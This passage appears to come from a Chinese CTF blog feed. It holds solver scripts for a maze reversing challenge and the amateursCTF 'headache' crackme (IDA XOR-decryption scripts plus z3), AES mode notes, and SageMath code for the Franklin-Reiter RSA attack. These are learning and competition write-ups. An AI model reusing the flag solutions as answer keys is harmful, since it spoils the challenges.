class="comment">#map2存在规律每个相差2512</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">625</span>):</span><br><span class="line">                map2.append(struct.unpack(<span class="string">&quot;I&quot;</span>, map2_data[i * <span class="number">4</span>: i * <span class="number">4</span> + <span class="number">4</span>])[<span class="number">0</span>])<span class="comment">#将4字节解包为unsigned int型</span></span><br><span class="line"></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">625</span>):</span><br><span class="line">        data.append(map1[i] ^ map2[i])<span class="comment">#dword_140A85010[25 * v629 + *(_DWORD *)&amp;v628[5]] ^ v630[25 * v629 + *(_DWORD *)&amp;v628[5]]) != 214原函数的map是经过异或加密的，异或回去获取原始的地图</span></span><br><span class="line">    <span class="keyword">return</span> data, <span class="built_in">bytearray</span>(map1[-<span class="number">4</span>:]), map3<span class="comment">#返回原始地图，方向数组，起点</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkValid</span>(<span class="params"><span class="built_in">map</span>, x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt; <span class="number">24</span> <span class="keyword">or</span> y &gt; <span class="number">24</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>[y * <span class="number">25</span> + x] == <span class="number">0xd6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params"><span class="built_in">map</span>, startX, startY, direct, path</span>):<span class="comment">#此处不用dfs搜索，因为路径都是单一的每次只要找到了下一次的路径就往路径列表内增加对应的值</span></span><br><span class="line">    <span class="built_in">map</span>[startY * <span class="number">25</span> + startX] = <span class="built_in">ord</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path) == <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, path</span><br><span class="line"></span><br><span class="line">    all_dir = []</span><br><span class="line">    <span class="keyword">if</span> checkValid(<span class="built_in">map</span>, startX - <span class="number">1</span>, startY):</span><br><span class="line">        all_dir.append((startX-<span class="number">1</span>, startY, direct[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">if</span> checkValid(<span class="built_in">map</span>, startX+ <span class="number">1</span>, startY ):</span><br><span class="line">        all_dir.append((startX+ <span class="number">1</span>, startY , direct[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">if</span> checkValid(<span class="built_in">map</span>, startX , startY- <span class="number">1</span>):</span><br><span class="line">        all_dir.append((startX , startY- <span class="number">1</span>, direct[<span class="number">2</span>]))</span><br><span class="line">    <span class="keyword">if</span> checkValid(<span class="built_in">map</span>, startX, startY + <span class="number">1</span>):</span><br><span class="line">        all_dir.append((startX, startY+<span class="number">1</span>, direct[<span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> all_dir:</span><br><span class="line">        result = solve(<span class="built_in">map</span>, <span class="built_in">dir</span>[<span class="number">0</span>], <span class="built_in">dir</span>[<span class="number">1</span>], direct, path + <span class="built_in">dir</span>[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">0</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMap</span>(<span class="params">map1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">        line = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            line += <span class="built_in">chr</span>(map1[i * <span class="number">25</span> + j])</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">total = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10933056</span>+<span class="number">10944</span>,<span class="number">10944</span>):<span class="comment">#每个迷宫函数的地址进行遍历</span></span><br><span class="line">    map1, dirs, target = decode(i+<span class="number">0x860</span>,tmp)</span><br><span class="line">    tmp+=<span class="number">1</span></span><br><span class="line">    total +=solve(map1, target[<span class="number">1</span>], target[<span class="number">0</span>], dirs.decode(<span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">mm = hashlib.md5(total.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(total))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;nssctf&#123;%s&#125;&#x27;</span> %mm)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
      </categories>
  </entry>
  <entry>
    <title>headache</title>
    <url>/2023/08/29/CTF%20WP/Re/headache/</url>
    <content><![CDATA[<p>main函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter flag: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">61</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_401290(s) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>sub_401290(s)作为flag校验函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_401290</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (*a1 ^ a1[<span class="number">25</span>]) != <span class="number">86</span> )<span class="comment">//对flag进行校验</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = &amp;loc_4012A4;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *v2++ ^= <span class="number">0xEA228DE6</span>;<span class="comment">//对函数进行解密</span></span><br><span class="line">  <span class="keyword">while</span> ( *(v2 - <span class="number">1</span>) != <span class="number">-366834202</span> );</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))loc_4012A4)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//汇编代码</span></span><br><span class="line"><span class="comment">/*.text:0000000000404374 loc_404374:                             ; CODE XREF: sub_401290+B↑j</span></span><br><span class="line"><span class="comment">.text:0000000000404374                 mov     eax, 0EA228DE6h</span></span><br><span class="line"><span class="comment">.text:0000000000404379                 lea     rsi, loc_4012A4</span></span><br><span class="line"><span class="comment">.text:0000000000404381</span></span><br><span class="line"><span class="comment">.text:0000000000404381 loc_404381:                             ; CODE XREF: sub_401290+30FA↓j</span></span><br><span class="line"><span class="comment">.text:0000000000404381                 xor     [rsi], eax</span></span><br><span class="line"><span class="comment">.text:0000000000404383                 add     rsi, 4</span></span><br><span class="line"><span class="comment">.text:0000000000404387                 cmp     [rsi-4], eax</span></span><br><span class="line"><span class="comment">.text:000000000040438A                 jnz     short loc_404381</span></span><br><span class="line"><span class="comment">.text:000000000040438C                 call    loc_4012A4</span></span><br><span class="line"><span class="comment">.text:0000000000404391                 retn*/</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>idc脚本(发现后续有一大堆加密，所以只是用这个暂时解密看看后面的函数怎么样)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">xor</span><span class="params">(addr, p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; Dword(addr + i - <span class="number">4</span>) != p; )</span><br><span class="line">    &#123;</span><br><span class="line">        PatchDword(addr + i, Dword(addr + i) ^ p);</span><br><span class="line">        i = i + <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    xor(<span class="number">0x004012A4</span>, <span class="number">0xEA228DE6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


</blockquote>
<p>loc_4012A4解密后的结果</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004012A4 loc_4012A4:                             ; CODE XREF: sub_401290+30FC↓p</span><br><span class="line">.text:00000000004012A4                                         ; DATA XREF: sub_401290+30E9↓o</span><br><span class="line">.text:00000000004012A4                 mov     r15b, [rdi+2Dh] ;flag[0x2d]</span><br><span class="line">.text:00000000004012A8                 xor     r15b, [rdi+0Eh] ;flag[0x0e]^flag[0x2d]</span><br><span class="line">.text:00000000004012AC                 cmp     r15b, 1Dh ;flag[0x0e]^flag[0x2d]=0x1d,作为flag校验条件</span><br><span class="line">.text:00000000004012B0                 jz      near ptr qword_404348+8</span><br><span class="line">.text:00000000004012B6                 xor     eax, eax</span><br><span class="line">.text:00000000004012B8                 retn</span><br></pre></td></tr></table></figure></div>

<p>接下来的结构都是类似于这个的循环,所以上脚本(注意 需要关掉graph模式的comments)</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simulate_xor</span>(<span class="params">address, xor_value</span>):</span><br><span class="line">    <span class="comment"># 模拟异或操作</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        patch_dword(address, idc.get_wide_dword(address) ^ xor_value)<span class="comment">#patch_dword改变对应地址的四字节</span></span><br><span class="line">        <span class="keyword">if</span>(idc.get_wide_dword(address)==xor_value):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        address+=<span class="number">4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">addr</span>):<span class="comment">#获取对应的值的z3条件因为有多种形式 mov就有[rdi],[rdi+1],[rdi+0Eh],这三种情况</span></span><br><span class="line">    <span class="comment">#cmp也有 1,1dh这两类情况</span></span><br><span class="line">    <span class="comment">#所以情况有点多直接用下面这个复杂的判断式子判断，也可以用一坨if else也行</span></span><br><span class="line">    l=<span class="built_in">int</span>(<span class="built_in">str</span>(idc.generate_disasm_line(addr,<span class="number">1</span>)).split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>][:-<span class="number">2</span>],<span class="number">16</span>) <span class="keyword">if</span> (<span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr,<span class="number">1</span>))<span class="keyword">and</span> <span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr,<span class="number">1</span>)))  <span class="keyword">else</span> <span class="built_in">int</span>(<span class="built_in">str</span>(idc.generate_disasm_line(addr,<span class="number">1</span>)).split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>][:-<span class="number">1</span>],<span class="number">16</span>)  <span class="keyword">if</span> (<span class="string">&#x27;h&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr,<span class="number">1</span>))<span class="keyword">and</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr,<span class="number">1</span>)) )  <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    r=<span class="built_in">int</span>(<span class="built_in">str</span>(idc.generate_disasm_line(addr+<span class="number">4</span>,<span class="number">1</span>)).split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>][:-<span class="number">2</span>],<span class="number">16</span>) <span class="keyword">if</span> (<span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr+<span class="number">4</span>,<span class="number">1</span>))<span class="keyword">and</span> <span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr+<span class="number">4</span>,<span class="number">1</span>)))  <span class="keyword">else</span> <span class="built_in">int</span>(<span class="built_in">str</span>(idc.generate_disasm_line(addr+<span class="number">4</span>,<span class="number">1</span>)).split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>][:-<span class="number">1</span>],<span class="number">16</span>)  <span class="keyword">if</span> (<span class="string">&#x27;h&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr+<span class="number">4</span>,<span class="number">1</span>))<span class="keyword">and</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(idc.generate_disasm_line(addr+<span class="number">4</span>,<span class="number">1</span>)) )  <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    e=<span class="built_in">int</span>(<span class="built_in">str</span>(idc.generate_disasm_line(addr+<span class="number">8</span>,<span class="number">1</span>)).split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;h&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;flag[<span class="subst">&#123;l&#125;</span>]^flag[<span class="subst">&#123;r&#125;</span>]==<span class="subst">&#123;e&#125;</span>&#x27;</span><span class="comment">#返回对应的字符串</span></span><br><span class="line">start=<span class="number">0x404374</span><span class="comment">#最开始的加密地址</span></span><br><span class="line">nextptr=<span class="number">0x401290</span><span class="comment">#最开始的flag校验</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line">flag=[BitVec(<span class="string">f&#x27;flag[<span class="subst">&#123;i&#125;</span>]&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">61</span>)]<span class="comment">#创建flag变量</span></span><br><span class="line">f=Solver()<span class="comment">#新建一个求解器类</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;amateursCTF&#123;&#x27;</span>):<span class="comment">#添加基础条件前几个字符必须得是&quot;amateursCTF&#123;&quot;,最后的字符必须得是&quot;&#125;&quot;</span></span><br><span class="line">    f.add(flag[i]==<span class="built_in">ord</span>(j))</span><br><span class="line">f.add(flag[<span class="number">60</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f.add(<span class="built_in">eval</span>(check(nextptr)))<span class="comment">#添加z3条件,eval执行对应的字符串获得flag[xx]^flag[xx]==xx，因为条件需要的是python中的等式判断所以直接用eval</span></span><br><span class="line">    tmp=<span class="built_in">str</span>(idc.generate_disasm_line(start,<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    instruction = <span class="built_in">int</span>(tmp[<span class="built_in">len</span>(<span class="string">&#x27;mov     eax, &#x27;</span>):-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">    tmp=idc.generate_disasm_line(start+<span class="number">24</span>,<span class="number">1</span>)<span class="comment">#有的时候需要第二个参数为1，为0可能会获取当前的数据而不是代码</span></span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp:<span class="comment">#用+号作为分隔符将call    near ptr qword_402348+1BCh分成[call    near ptr qword_402348,1BCh]这个列表用于得到对应地址值因为每次都只用了6个字符(此处为402348)作为地址所以直接获得第1个元素的后6个字符加上1BC(去掉h)就行</span></span><br><span class="line">        nextptr=<span class="built_in">int</span>(tmp[-<span class="number">6</span>:],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmplist=tmp.split(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> tmplist[<span class="number">1</span>]:</span><br><span class="line">            nextptr=<span class="built_in">int</span>(tmplist[<span class="number">0</span>][-<span class="number">6</span>:],<span class="number">16</span>)+<span class="built_in">int</span>(tmplist[<span class="number">1</span>][:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nextptr=<span class="built_in">int</span>(tmplist[<span class="number">0</span>][-<span class="number">6</span>:],<span class="number">16</span>)+<span class="built_in">int</span>(tmplist[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">    simulate_xor(nextptr,instruction)</span><br><span class="line">    tmp=<span class="built_in">str</span>(idc.generate_disasm_line(nextptr+<span class="number">12</span>,<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;jz&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp:<span class="comment">#jz相当于跳转到下一次加密，如果没有jz了就代表加密结束了,所以就结束解密循环</span></span><br><span class="line">        <span class="built_in">print</span>(count,<span class="built_in">hex</span>(nextptr+<span class="number">12</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp:<span class="comment">#有些情况是地址+数字代表一个位置,也有直接jz地址的情况</span></span><br><span class="line">        start=<span class="built_in">int</span>(tmp[-<span class="number">6</span>:],<span class="number">16</span>)<span class="comment">#获取后6个字符串并用16进制形式转化成数字</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmplist=tmp.split(<span class="string">&#x27;+&#x27;</span>)<span class="comment">#用+号作为分隔符将jz      near ptr qword_404348+8分成[jz      near ptr qword_404348,8]这个列表用于得到对应地址值</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> tmplist[<span class="number">1</span>]:</span><br><span class="line">            start=<span class="built_in">int</span>(tmplist[<span class="number">0</span>][-<span class="number">6</span>:],<span class="number">16</span>)+<span class="built_in">int</span>(tmplist[<span class="number">1</span>][:-<span class="number">1</span>],<span class="number">16</span>)<span class="comment">#有h代表16进制数同时又有+号所以直接模拟运算获得对应地址</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start=<span class="built_in">int</span>(tmplist[<span class="number">0</span>][-<span class="number">6</span>:],<span class="number">16</span>)+<span class="built_in">int</span>(tmplist[<span class="number">1</span>],<span class="number">16</span>)<span class="comment">#没有h直接获取+号前面6个字符和+号后面所有数值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(start))</span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):<span class="comment">#check()函数检查是否有解</span></span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()<span class="comment">#m用于得到最后的解</span></span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">61</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))<span class="comment">#将61个flag字符添加进flag字符串里</span></span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)<span class="comment">#输出flag</span></span><br><span class="line">    f.add(Or(condition))<span class="comment">#将现在的情况添加进条件内防止下次循环获得一样的情况，用于检查是否有多解</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
      </categories>
  </entry>
  <entry>
    <title>AES</title>
    <url>/2023/07/17/Crypto/AES/AES/</url>
    <content><![CDATA[<h2 id="AES-ECB"><a href="#AES-ECB" class="headerlink" title="AES ECB"></a>AES ECB</h2><p>不带初始向量,以16字节为一组</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">m=<span class="string">b&#x27;xxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyy&#x27;</span></span><br><span class="line">key=<span class="string">b&#x27;aEs_1s_SO0o_e4sY&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">enc=aes.encrypt(m)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure></div>

<p>可以分解为</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">m1=<span class="string">b&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">m2=<span class="string">b&#x27;yyyyyyyyyyyyyyyy&#x27;</span></span><br><span class="line">key=<span class="string">b&#x27;aEs_1s_SO0o_e4sY&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">enc1=aes.encrypt(m1)</span><br><span class="line">enc2=aes.encrypt(m2)</span><br><span class="line">enc=enc1+enc2</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure></div>

<p>这两个输出是一致的，相当于将明文以16字节分成多份进行相同的加密</p>
<h2 id="AES-CBC"><a href="#AES-CBC" class="headerlink" title="AES CBC"></a>AES CBC</h2><p>带初始向量，相当于每步都进行异或的ECB模式</p>
<p>初始向量必须是16字节，因为明文是以16字节为一组进行加密的，异或的时候也得如此才能保证数据的一致性</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">m=<span class="string">b&#x27;xxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyy&#x27;</span></span><br><span class="line">key=<span class="string">b&#x27;aEs_1s_SO0o_e4sY&#x27;</span></span><br><span class="line">iv=<span class="string">b&#x27;D0g3D0g3D0g3D0g3&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc=aes.encrypt(m)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure></div>

<p>等效于ECB模式的，第一步第一组明文异或初始向量，第二部第二组明文异或上一次的加密结果，以此类推</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">m1=<span class="string">b&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">m2=<span class="string">b&#x27;yyyyyyyyyyyyyyyy&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">enc1=aes.encrypt(strxor(m1,iv))</span><br><span class="line">enc2=aes.encrypt(strxor(m2,enc1))</span><br><span class="line">enc=enc1+enc2</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure></div>

<h2 id="Padding"><a href="#Padding" class="headerlink" title="Padding"></a>Padding</h2><p>补足不满16的整数倍的字符串，补足的byte为缺失的长度</p>
<p>如下</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [19]: pad(b&#x27;123456&#x27;, AES.block_size)</span><br><span class="line">Out[19]: b&#x27;123456\n\n\n\n\n\n\n\n\n\n&#x27;</span><br><span class="line"></span><br><span class="line">In [20]: pad(b&#x27;1234567&#x27;, AES.block_size)</span><br><span class="line">Out[20]: b&#x27;1234567\t\t\t\t\t\t\t\t\t&#x27;</span><br><span class="line"></span><br><span class="line">In [21]: pad(b&#x27;12345678&#x27;, AES.block_size)</span><br><span class="line">Out[21]: b&#x27;12345678\x08\x08\x08\x08\x08\x08\x08\x08&#x27;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Crypto</category>
        <category>AES</category>
      </categories>
  </entry>
  <entry>
    <title>CRT中国剩余定理</title>
    <url>/2023/10/05/Crypto/RSA/CRT%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>Franklin-Reiter_相关信息攻击</title>
    <url>/2024/02/24/Crypto/RSA/Franklin-Reiter_%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="Franklin-Reiter相关消息攻击"><a href="#Franklin-Reiter相关消息攻击" class="headerlink" title="Franklin-Reiter相关消息攻击"></a>Franklin-Reiter相关消息攻击</h2><p>已知<code>pow(x,e,n)</code>和<code>pow(ax+b,e,n)</code></p>
<p>可以通过形如下列式子求解</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    PR=PolynomialRing(Zmod(n),<span class="string">&#x27;X&#x27;</span>) </span><br><span class="line">    X=PR.gen()</span><br><span class="line">    f1 = X**e - c1 <span class="comment">#</span></span><br><span class="line">    f2 = (X*a+ b)**e - c2 <span class="comment">#</span></span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>]) <span class="comment"># 系数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compositeModulusGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>最好将x的已知位给到最大，比如<code>pow(x&lt;&lt;30,e,n)</code>与<code>pow(a*(x&lt;&lt;30),e,n)</code>这里会有三十的已知位</p>
<p>如果直接把x&lt;&lt;30求解，可能会有较大误差可以试着更改</p>
<p><code>f1 = (X*2**30)**e - c1</code> <code>f2 = ((X*2**30)*a)**e - c2</code></p>
<p>注意sage中&lt;&lt;并不是左移而是增大多少次方</p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>Rsa共模攻击</title>
